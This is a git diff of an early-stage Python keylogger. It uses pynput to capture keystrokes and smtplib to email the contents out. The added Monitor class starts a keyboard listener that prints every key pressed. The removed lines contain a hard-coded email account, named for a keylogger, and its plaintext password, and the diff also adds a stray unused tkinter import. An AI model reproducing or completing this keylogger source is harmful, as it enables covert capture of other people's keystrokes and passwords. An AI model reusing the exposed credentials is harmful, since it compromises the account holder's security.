@@ -1,8 +1,13 @@
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText                                                               
+from email.mime.text import MIMEText
+from tkinter import W                                                               
 from pynput import keyboard, mouse
 import smtplib
+
+"""
+    EMAIL SENDING
+"""
 
 def timestamp():
     right_now = datetime.now()
@@ -27,7 +32,29 @@ def send_email(email_address, password, contents):
 
     server.quit()
 
-ADDRESS = 'keylogger-sap@outlook.com'
-PASSWORD = 'MyK3yLogger124'
+"""
+    MONITORING
+"""
 
-send_email(ADDRESS, PASSWORD, 'hello champion!')
+class Monitor:
+    def on_press(self, key):
+        print(key)
+
+    def __init__(self):
+        self.keys = keyboard.Listener(on_press=self.on_press)
+    
+    def run(self):
+        self.keys.start()
+        while True:
+            pass
+
+"""
+    MAIN
+"""
+
+def main():
+    monitor = Monitor()
+    monitor.run()
+
+if __name__ == '__main__':
+    main()
